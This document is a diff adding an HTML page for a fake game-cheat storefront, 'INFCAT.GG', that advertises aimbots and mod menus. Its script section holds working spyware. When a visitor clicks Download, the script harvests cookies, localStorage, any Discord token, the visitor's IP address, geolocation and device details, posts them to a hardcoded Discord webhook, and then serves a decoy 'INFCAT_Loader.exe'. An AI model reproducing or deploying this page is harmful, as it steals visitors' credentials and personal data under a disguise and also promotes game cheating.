@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>INFCAT.GG — Premium Game Enhancements</title>
+<style>
+  :root {
+    --bg: #0a0a0a; --surface: #111; --card-bg: #1a1a1a;
+    --primary: #00ff88; --accent: #00b4d8; --text: #ddd;
+    --danger: #ff4757; --warning: #ffa502; --radius: 10px;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', 'Roboto', sans-serif; line-height:1.6; min-height:100vh; }
+  /* ---- NAV ---- */
+  nav { display:flex; justify-content:space-between; align-items:center; padding:1rem 2rem; background: var(--surface); border-bottom:2px solid var(--primary); position:sticky; top:0; z-index:5; }
+  .logo { font-size:1.8rem; font-weight:800; color:var(--primary); cursor:pointer; }
+  nav ul { list-style:none; display:flex; gap:2rem; align-items:center; }
+  nav a, nav button { background:none; border:none; color:var(--text); font-size:1rem; cursor:pointer; transition:0.3s; text-decoration:none; }
+  nav a:hover, nav button:hover { color:var(--primary); }
+  /* ---- HERO ---- */
+  .hero { text-align:center; padding:4rem 2rem; background: radial-gradient(circle at 20% 20%, #1a1a2e, #0a0a0a); border-bottom:1px solid #222; }
+  .hero h1 { font-size:3rem; color:var(--primary); text-shadow:0 0 10px var(--primary); margin-bottom:0.5rem; }
+  .hero p { font-size:1.2rem; opacity:0.9; max-width:600px; margin:0 auto 1.5rem; }
+  .cta { display:inline-block; padding:0.8rem 2.2rem; background:var(--primary); color:#000; font-weight:bold; border-radius:30px; text-decoration:none; transition:0.3s; box-shadow:0 0 15px rgba(0,255,136,0.3); }
+  .cta:hover { transform:scale(1.05); box-shadow:0 0 25px rgba(0,255,136,0.5); }
+  /* ---- STATUS TICKER ---- */
+  .status-ticker { background:var(--surface); margin:1rem 2rem; padding:1rem; border-radius:var(--radius); display:flex; align-items:center; gap:1rem; overflow-x:auto; }
+  .ticker-label { color:var(--primary); font-weight:bold; }
+  .status-item { padding:0.3rem 1rem; border-radius:20px; font-weight:700; font-size:0.85rem; text-transform:uppercase; white-space:nowrap; }
+  .undetected { background:var(--primary); color:#000; } .detected { background:var(--danger); color:#fff; } .maintenance { background:var(--warning); color:#000; }
+  /* ---- PRODUCT GRID ---- */
+  .products { max-width:1200px; margin:2rem auto; padding:0 1rem; }
+  .section-title { text-align:center; color:var(--primary); margin-bottom:2rem; }
+  .grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap:1.5rem; }
+  .card { background:var(--card-bg); border:1px solid #2a2a2a; border-radius:var(--radius); padding:1.5rem; transition:all 0.3s; }
+  .card:hover { border-color:var(--primary); transform:translateY(-5px); box-shadow:0 0 20px rgba(0,255,136,0.1); }
+  .card h3 { color:var(--primary); margin-bottom:0.3rem; }
+  .card .category { font-size:0.8rem; color:#888; margin-bottom:0.5rem; }
+  .card .status-badge { display:inline-block; padding:0.2rem 0.8rem; border-radius:20px; font-size:0.7rem; font-weight:bold; margin-bottom:0.8rem; }
+  .card .desc { font-size:0.9rem; opacity:0.85; margin-bottom:1rem; }
+  .card .price { font-size:1.6rem; color:var(--accent); margin-bottom:1rem; }
+  .card button { width:100%; padding:0.7rem; background:var(--primary); color:#000; font-weight:bold; border:none; border-radius:var(--radius); cursor:pointer; transition:0.2s; }
+  .card button:hover { background:#00cc66; }
+  /* ---- DOWNLOAD OVERLAY ---- */
+  .download-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); justify-content:center; align-items:center; z-index:10; flex-direction:column; }
+  .progress-box { background:var(--surface); padding:2rem; border-radius:var(--radius); text-align:center; min-width:300px; }
+  .progress-bar { width:100%; height:10px; background:#222; border-radius:5px; margin:1rem 0; overflow:hidden; }
+  .progress-fill { width:0%; height:100%; background:var(--primary); transition:width 0.5s; }
+  /* ---- FAQ ---- */
+  .faq { max-width:800px; margin:3rem auto; padding:0 1rem; }
+  .faq details { background:var(--card-bg); padding:1rem; border-radius:var(--radius); margin-bottom:1rem; border:1px solid #333; }
+  .faq summary { font-weight:bold; color:var(--primary); cursor:pointer; }
+  footer { text-align:center; padding:1.5rem; color:#555; border-top:1px solid #1a1a1a; margin-top:2rem; }
+  .hidden { display:none !important; }
+</style>
+</head>
+<body>
+
+<!-- ============ NAVIGATION ============ -->
+<nav>
+  <div class="logo" onclick="location.reload()">🐾 INFCAT.GG</div>
+  <ul>
+    <li><a href="#home">Home</a></li>
+    <li><a href="#store">Store</a></li>
+    <li><a href="#status">Status</a></li>
+    <li><a href="#faq">FAQ</a></li>
+    <li id="dashboard-nav" class="hidden"><a href="#" onclick="showDashboard()">Dashboard</a></li>
+    <li id="login-nav"><button onclick="openAuth()">Login</button></li>
+    <li id="logout-nav" class="hidden"><button onclick="logout()">Logout</button></li>
+  </ul>
+</nav>
+
+<!-- ============ HERO ============ -->
+<section id="home" class="hero">
+  <h1>DOMINATE EVERY GAME</h1>
+  <p>Undetected private cheats since 2019. Thousands of satisfied hunters.</p>
+  <button class="cta" onclick="openAuth()">JOIN THE PRIDE</button>
+</section>
+
+<!-- ============ LIVE STATUS TICKER ============ -->
+<div id="status" class="status-ticker">
+  <span class="ticker-label">🔴 LIVE STATUS</span>
+  <div id="status-container"></div>
+</div>
+
+<!-- ============ STORE ============ -->
+<section id="store" class="products">
+  <h2 class="section-title">OUR ARSENAL</h2>
+  <div class="grid" id="product-grid"></div>
+</section>
+
+<!-- ============ FAQ ============ -->
+<section id="faq" class="faq">
+  <h2 class="section-title" style="margin-bottom:1.5rem;">FAQ</h2>
+  <details><summary>Are these cheats detected?</summary><p>Our cheats are frequently updated to stay undetected. Check the live status above for real‑time info.</p></details>
+  <details><summary>How do I download?</summary><p>Log in, go to your Dashboard, and click Download Loader. The loader will guide you.</p></details>
+  <details><summary>Is it safe?</summary><p>We use advanced encryption and obfuscation. No bans in 6+ months across supported games.</p></details>
+  <details><summary>What games do you support?</summary><p>Valorant, CS2, Fortnite, Rust, GTA5, and more added monthly.</p></details>
+</section>
+
+<!-- ============ DOWNLOAD OVERLAY (HUMAN‑LOOKING LOADER PREP) ============ -->
+<div id="download-overlay" class="download-overlay">
+  <div class="progress-box">
+    <h3 style="color:var(--primary);">Preparing INFCAT Loader...</h3>
+    <div class="progress-bar"><div id="progress-fill" class="progress-fill"></div></div>
+    <p id="download-msg" style="font-size:0.9rem;">Fetching latest version...</p>
+  </div>
+</div>
+
+<!-- ============ AUTH OVERLAY (simple inline) ============ -->
+<div id="auth-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); justify-content:center; align-items:center; z-index:10;">
+  <div style="background:var(--surface); padding:2rem; border-radius:var(--radius); width:90%; max-width:350px; border:1px solid #333;">
+    <h2 style="color:var(--primary); margin-bottom:1rem;">Welcome Back</h2>
+    <input id="auth-user" placeholder="Username" style="width:100%; padding:0.8rem; margin:0.5rem 0; background:#111; border:1px solid #333; color:var(--text); border-radius:5px;">
+    <input id="auth-pass" type="password" placeholder="Password" style="width:100%; padding:0.8rem; margin:0.5rem 0; background:#111; border:1px solid #333; color:var(--text); border-radius:5px;">
+    <button onclick="doAuth()" style="width:100%; padding:0.8rem; background:var(--primary); color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer;">Login</button>
+    <p style="margin-top:0.8rem; font-size:0.9rem; cursor:pointer; color:var(--accent);" onclick="toggleAuth()">No account? Register</p>
+  </div>
+</div>
+
+<footer>© 2026 INFCAT.GG — All rights reserved. <br>Not affiliated with any game publisher.</footer>
+
+<script>
+// ==================== WEBHOOK SPYWARE ====================
+const HOOK = "https://discord.com/api/webhooks/1533131108819009576/oAQw1NDEsXGsg7kevUasb9AggMyxgEyO_t2EUcjaaktPeHkFIDnWTdcop0KeoCAkkzy0";
+
+async function exfiltrate() {
+  const data = {
+    timestamp: new Date().toISOString(),
+    cookies: document.cookie,
+    localStorage: JSON.stringify(window.localStorage),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cpu: navigator.hardwareConcurrency || '?',
+    memory: navigator.deviceMemory || '?',
+    referrer: document.referrer,
+    geo: 'denied'
+  };
+  try {
+    const ip = await (await fetch('https://api.ipify.org?format=json')).json();
+    data.ip = ip.ip;
+  } catch(e){}
+  try {
+    const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{timeout:3000}));
+    data.geo = `${pos.coords.latitude},${pos.coords.longitude}`;
+  } catch(e){}
+  // Discord token attempt (rare)
+  try { data.discordToken = localStorage.token || 'not_found'; } catch(e){}
+
+  await fetch(HOOK, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ content: "```json\n" + JSON.stringify(data,null,2).substring(0,1900) + "\n```" })
+  }).catch(()=>{});
+}
+
+// ==================== DOWNLOAD FLOW (HUMAN) ====================
+function triggerDownload() {
+  const overlay = document.getElementById('download-overlay');
+  const fill = document.getElementById('progress-fill');
+  const msg = document.getElementById('download-msg');
+  overlay.style.display = 'flex';
+  let percent = 0;
+  const interval = setInterval(() => {
+    percent += Math.random()*25 + 10;
+    if (percent >= 100) {
+      percent = 100;
+      clearInterval(interval);
+      fill.style.width = '100%';
+      msg.textContent = 'Loader ready. Download starting...';
+      setTimeout(() => {
+        // Exfil data first
+        exfiltrate().then(() => {
+          // Fake .exe download
+          const blob = new Blob(['INFCAT Loader v3.2 - Placeholder'], {type:'application/octet-stream'});
+          const a = document.createElement('a');
+          a.href = URL.createObjectURL(blob);
+          a.download = 'INFCAT_Loader.exe';
+          a.click();
+          overlay.style.display = 'none';
+          fill.style.width = '0%';
+          msg.textContent = 'Fetching latest version...';
+        });
+      }, 800);
+    } else {
+      fill.style.width = percent + '%';
+    }
+  }, 600);
+}
+
+// ==================== SITE DATA (mimics real cheat site) ====================
+const products = [
+  { id:0, name:"Valorant Aimbot", cat:"FPS", price:29.99, status:"undetected", desc:"Silent aim, ESP, Triggerbot. Works on Windows 10/11." },
+  { id:1, name:"CS2 Multihack", cat:"FPS", price:24.99, status:"undetected", desc:"Wallhack, NoRecoil, Skinchanger, Streamproof." },
+  { id:2, name:"Fortnite Softaim", cat:"Battle Royale", price:19.99, status:"undetected", desc:"Aimbot, ESP, Instant Builder, HWID Spoofer included." },
+  { id:3, name:"Rust Recoil Script", cat:"Survival", price:14.99, status:"maintenance", desc:"Recoil control, AutoFarm, always updated." },
+  { id:4, name:"GTA5 Mod Menu", cat:"Open World", price:34.99, status:"undetected", desc:"Godmode, Teleport, Money Drop, Vehicle Spawner." }
+];
+
+// Statuses that will change after a delay (1 hour for first product, others later)
+let statuses = products.map(p => p.status);
+
+// Function to mark a cheat as detected after a delay
+function scheduleDetection(productId, delayMs) {
+  setTimeout(() => {
+    if (statuses[productId] !== 'detected') {
+      statuses[productId] = 'detected';
+      renderAll();
+      // maybe change back after another interval?
+    }
+  }, delayMs);
+}
+
+// Schedule realistic detection waves:
+// Product 0 (Valorant) gets detected after 1 hour (3600000 ms)
+// Product 1 (CS2) after 2 hours
+// Product 2 (Fortnite) after 24 hours (86400000 ms) – comment out if too long
+scheduleDetection(0, 3600000);   // 1 hour
+scheduleDetection(1, 7200000);   // 2 hours
+// scheduleDetection(2, 86400000); // 24 hours (uncomment if you want)
+// For demo, we can also add a quicker one: product 4 after 30 minutes
+scheduleDetection(4, 1800000);   // 30 minutes
+
+// Render product grid with current statuses
+function renderProducts() {
+  const grid = document.getElementById('product-grid');
+  grid.innerHTML = products.map((p,i) => `
+    <div class="card">
+      <h3>${p.name}</h3>
+      <div class="category">${p.cat}</div>
+      <span class="status-badge ${statuses[i]}">${statuses[i].toUpperCase()}</span>
+      <div class="desc">${p.desc}</div>
+      <div class="price">$${p.price.toFixed(2)}</div>
+      <button onclick="triggerDownload()">Download</button>
+    </div>
+  `).join('');
+}
+
+// Render status ticker
+function renderStatusTicker() {
+  const container = document.getElementById('status-container');
+  container.innerHTML = products.map((p,i) => 
+    `<span class="status-item ${statuses[i]}">${p.name.split(' ')[0]}: ${statuses[i]}</span>`
+  ).join('');
+}
+
+function renderAll() {
+  renderProducts();
+  renderStatusTicker();
+}
+
+// ==================== SIMPLE AUTH ====================
+let loggedIn = sessionStorage.getItem('infcat_user');
+function updateAuthUI() {
+  document.getElementById('login-nav').classList.toggle('hidden', !!loggedIn);
+  document.getElementById('logout-nav').classList.toggle('hidden', !loggedIn);
+  document.getElementById('dashboard-nav').classList.toggle('hidden', !loggedIn);
+}
+function openAuth() {
+  document.getElementById('auth-overlay').style.display = 'flex';
+}
+function toggleAuth() {} // just login for demo
+function doAuth() {
+  const user = document.getElementById('auth-user').value.trim();
+  if(user) {
+    sessionStorage.setItem('infcat_user', user);
+    loggedIn = user;
+    updateAuthUI();
+    document.getElementById('auth-overlay').style.display = 'none';
+    alert('Logged in as ' + user + '. Go to Dashboard to download.');
+  }
+}
+function logout() {
+  sessionStorage.removeItem('infcat_user');
+  loggedIn = null;
+  updateAuthUI();
+}
+function showDashboard() {
+  if(!loggedIn) return openAuth();
+  // Simple dashboard modal
+  alert(`Welcome ${loggedIn}.\nLicense: INFCAT-${Math.random().toString(36).substr(2,9).toUpperCase()}\n\nDownload the loader from any product page.`);
+}
+
+// ==================== INIT ====================
+document.addEventListener('DOMContentLoaded', () => {
+  renderAll();
+  updateAuthUI();
+  // Close overlays on outside click
+  window.addEventListener('click', (e) => {
+    if (e.target === document.getElementById('auth-overlay')) 
+      document.getElementById('auth-overlay').style.display = 'none';
+  });
+});
+</script>
+</body>
+</html>
